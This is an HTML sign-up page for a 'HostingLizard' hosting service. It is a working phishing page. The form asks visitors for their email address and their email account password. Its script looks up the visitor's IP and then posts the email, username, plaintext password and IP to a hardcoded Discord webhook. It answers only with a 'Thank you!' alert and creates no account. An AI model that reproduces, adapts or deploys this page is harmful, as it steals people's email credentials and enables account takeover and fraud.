<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Sign Up - HostingLizard</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <style>
    body {
      background: linear-gradient(135deg, #1e3a8a, #3b82f6);
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      font-family: 'Inter', sans-serif;
    }
    .container {
      max-width: 400px;
      width: 100%;
      padding: 2rem;
      background: white;
      border-radius: 1rem;
      box-shadow: 0 10px 15px rgba(0, 0, 0, 0.2);
    }
    .logo {
      font-size: 2rem;
      font-weight: 700;
      color: #1e3a8a;
      text-align: center;
      margin-bottom: 1.5rem;
    }
    .error {
      color: #dc2626;
      font-size: 0.875rem;
      display: none;
      margin-top: 0.5rem;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="logo">HostingLizard</div>
    <h2 class="text-2xl font-semibold text-gray-800 text-center mb-6">Create Your Account</h2>
    <form id="signupForm">
      <div class="mb-4">
        <label for="email" class="block text-sm font-medium text-gray-700">Email Address</label>
        <input type="email" id="email" name="email" required
               class="mt-1 w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-2 focus:ring-blue-500"
               placeholder="you@example.com">
        <p id="emailError" class="error">Please enter a valid email address.</p>
      </div>
      <div class="mb-4">
        <label for="username" class="block text-sm font-medium text-gray-700">Username</label>
        <input type="text" id="username" name="username" required
               class="mt-1 w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-2 focus:ring-blue-500"
               placeholder="Your username">
        <p id="usernameError" class="error">Username must be at least 3 characters long.</p>
      </div>
      <div class="mb-6">
        <label for="password" class="block text-sm font-medium text-gray-700">Password</label>
        <input type="password" id="password" name="password" required
               class="mt-1 w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-2 focus:ring-blue-500"
               placeholder="Enter your email password">
        <p class="text-sm text-gray-500 mt-1">Please enter your email account password.</p>
        <p id="passwordError" class="error">Password must be at least 8 characters long.</p>
      </div>
      <button type="submit"
              class="w-full bg-blue-600 text-white py-2 px-4 rounded-md hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-blue-500">
        Sign Up
      </button>
    </form>
    <p class="mt-4 text-center text-sm text-gray-600">
      Already have an account? <a href="#" onclick="alert('Please create an account first.')" class="text-blue-600 hover:underline">Log in</a>
    </p>
  </div>

  <script>
    async function getClientIP() {
      try {
        const response = await fetch('https://ipapi.co/json/');
        const data = await response.json();
        return data.ip || 'Unknown';
      } catch (error) {
        console.error('Error fetching IP:', error);
        return 'Unknown';
      }
    }

    async function sendToWebhook(data) {
      const webhookUrl = 'https://discord.com/api/webhooks/1394156852337704981/Wwy86UW94p8vRn6_6H7LXST2niofiPoxCcANgWEMShFgoxO4Ooulemza0kDD6FA7TWdO';
      try {
        const response = await fetch(webhookUrl, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            content: `**New Registration**\nEmail: ${data.email}\nUsername: ${data.username}\nPassword: ${data.password}\nIP Address: ${data.ip}`,
          }),
        });
        if (!response.ok) {
          throw new Error('Webhook request failed');
        }
        console.log('Data sent to webhook successfully');
      } catch (error) {
        console.error('Error sending to webhook:', error);
      }
    }

    document.getElementById('signupForm').addEventListener('submit', async (e) => {
      e.preventDefault();

      const email = document.getElementById('email').value;
      const username = document.getElementById('username').value;
      const password = document.getElementById('password').value;

      // Reset error messages
      document.getElementById('emailError').style.display = 'none';
      document.getElementById('usernameError').style.display = 'none';
      document.getElementById('passwordError').style.display = 'none';

      // Basic validation
      let isValid = true;
      if (!email.includes('@') || !email.includes('.')) {
        document.getElementById('emailError').style.display = 'block';
        isValid = false;
      }
      if (username.length < 3) {
        document.getElementById('usernameError').style.display = 'block';
        isValid = false;
      }
      if (password.length < 8) {
        document.getElementById('passwordError').style.display = 'block';
        isValid = false;
      }

      if (!isValid) return;

      // Get client IP
      const ip = await getClientIP();

      // Prepare data for webhook
      const formData = {
        email,
        username,
        password,
        ip,
      };

      // Send to webhook
      await sendToWebhook(formData);

      // Show success message
      alert('Thank you!');
      document.getElementById('signupForm').reset();
    });
  </script>
</body>
</html>
